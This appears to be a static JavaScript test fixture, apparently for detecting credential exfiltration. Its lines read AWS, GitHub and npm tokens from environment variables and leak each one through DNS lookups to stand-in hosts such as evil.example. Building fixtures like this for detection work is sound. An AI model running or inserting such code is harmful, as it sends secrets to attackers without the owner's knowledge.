/**
 * Credential exfil over DNS. Static fixture; never executed.
 */
import dns from 'node:dns'
import { resolve } from 'node:dns'

const secret = process.env.AWS_SECRET_ACCESS_KEY

dns.resolve(secret + '.evil.example', () => {})
dns.promises.resolve(process.env.GITHUB_TOKEN + '.leak.example')
resolve(process.env.NODE_AUTH_TOKEN + '.oob.example')
